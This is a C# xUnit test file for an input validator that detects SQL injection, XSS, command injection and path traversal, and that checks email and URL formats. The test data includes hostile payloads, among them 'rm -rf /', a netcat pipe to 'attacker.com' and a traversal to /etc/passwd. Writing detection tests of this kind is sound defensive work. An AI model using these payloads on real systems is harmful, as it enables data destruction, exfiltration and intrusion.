using System;
using Xunit;
using SmartWorkz.Core.Shared.Security.Validation;

namespace SmartWorkz.Core.Tests.Security
{
    public class InputValidatorTests
    {
        private readonly InputValidator _sut = new();

        [Theory]
        [InlineData("'; DROP TABLE users; --")]
        [InlineData("1' OR '1'='1")]
        [InlineData("admin'--")]
        public void ContainsSqlInjectionPattern_MaliciousInput_ReturnsTrue(string input)
        {
            Assert.True(_sut.ContainsSqlInjectionPattern(input));
        }

        [Theory]
        [InlineData("John Doe")]
        [InlineData("user@example.com")]
        public void ContainsSqlInjectionPattern_LegitimateInput_ReturnsFalse(string input)
        {
            Assert.False(_sut.ContainsSqlInjectionPattern(input));
        }

        [Theory]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("<img src=x onerror=alert('xss')>")]
        public void ContainsXssPattern_MaliciousInput_ReturnsTrue(string input)
        {
            Assert.True(_sut.ContainsXssPattern(input));
        }

        [Theory]
        [InlineData("Hello World")]
        [InlineData("This is safe")]
        public void ContainsXssPattern_LegitimateInput_ReturnsFalse(string input)
        {
            Assert.False(_sut.ContainsXssPattern(input));
        }

        [Theory]
        [InlineData("; rm -rf /")]
        [InlineData("| nc attacker.com 1234")]
        [InlineData("$(whoami)")]
        public void ContainsCommandInjectionPattern_MaliciousInput_ReturnsTrue(string input)
        {
            Assert.True(_sut.ContainsCommandInjectionPattern(input));
        }

        [Theory]
        [InlineData("filename.txt")]
        [InlineData("document123")]
        public void ContainsCommandInjectionPattern_LegitimateInput_ReturnsFalse(string input)
        {
            Assert.False(_sut.ContainsCommandInjectionPattern(input));
        }

        [Theory]
        [InlineData("../../../etc/passwd")]
        [InlineData("..\\..\\windows\\system32")]
        public void ContainsPathTraversalPattern_MaliciousInput_ReturnsTrue(string input)
        {
            Assert.True(_sut.ContainsPathTraversalPattern(input));
        }

        [Theory]
        [InlineData("document.txt")]
        [InlineData("subfolder/file.pdf")]
        public void ContainsPathTraversalPattern_LegitimateInput_ReturnsFalse(string input)
        {
            Assert.False(_sut.ContainsPathTraversalPattern(input));
        }

        [Fact]
        public void SanitizeHtml_RemovesDangerousTags()
        {
            var input = "<p>Safe text</p><script>alert('xss')</script>";
            var result = _sut.SanitizeHtml(input);
            Assert.DoesNotContain("<script>", result);
            Assert.DoesNotContain("alert", result);
        }

        [Theory]
        [InlineData("user@example.com")]
        [InlineData("test.user+tag@example.co.uk")]
        public void IsValidEmail_ValidEmail_ReturnsTrue(string email)
        {
            Assert.True(_sut.IsValidEmail(email));
        }

        [Theory]
        [InlineData("invalid.email")]
        [InlineData("user@")]
        public void IsValidEmail_InvalidEmail_ReturnsFalse(string email)
        {
            Assert.False(_sut.IsValidEmail(email));
        }

        [Theory]
        [InlineData("https://example.com")]
        [InlineData("http://api.smartworkz.com/v1/users")]
        public void IsValidUrl_ValidUrl_ReturnsTrue(string url)
        {
            Assert.True(_sut.IsValidUrl(url));
        }

        [Theory]
        [InlineData("not a url")]
        [InlineData("javascript:alert('xss')")]
        public void IsValidUrl_InvalidUrl_ReturnsFalse(string url)
        {
            Assert.False(_sut.IsValidUrl(url));
        }
    }
}
